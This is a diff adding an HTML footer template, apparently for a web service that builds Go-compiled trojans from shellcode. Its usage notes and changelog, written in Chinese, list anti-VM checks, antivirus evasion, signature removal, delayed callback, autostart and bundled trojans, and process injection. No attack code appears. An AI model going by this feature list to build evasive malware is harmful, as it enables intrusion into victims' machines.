@@ -1,0 +1,43 @@
+{{define "userfooter"}}
+<hr>
+<p>
+    <a class="btn btn-danger" data-toggle="collapse" href="#know" role="button" aria-expanded="false"
+       aria-controls="#know">使用须知</a>
+    <button class="btn btn-info" type="button" data-toggle="collapse" data-target="#flag" aria-expanded="false"
+            aria-controls="flag">更新记录
+    </button>
+</p>
+<div class="row">
+    <div class="col">
+        <div class="collapse multi-collapse" id="know">
+            <div class="card card-body">
+                <p>1.生成后的马仅供测试</p>
+                <p>2.加入了简单的反虚拟机机制</p>
+                <p>3.本站不会保留任何shellcode记录</p>
+                <p>木马是由go编译而成</p>
+                <p>2020年11月6日</p>
+            </div>
+        </div>
+    </div>
+    <div class="col">
+        <div class="collapse multi-collapse" id="flag">
+            <div class="card card-body">
+                <p>2020/11/11 增加延时上线执行功能，修复一堆bug</p>
+                <p>2020/12/14 增加hex加密，恢复免杀，去除一些特征。</p>
+                <p>2020/12/24 后端改用go重写，恢复免杀，去除延时和反虚拟机功能。</p>
+                <p>2020/12/26 增加注册功能。</p>
+                <p>2020/12/27 增加延时上线设置功能。</p>
+                <p>2021/01/25 增加后台管理。</p>
+                <p>2021/01/26 增加捆绑马，自启马。</p>
+                <p>2021/07/12 增加进程注入的马子</p>
+		<p>2021/08/05 更新免杀,继续bypass</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+</div>
+</body>
+
+</html>
+{{end}}
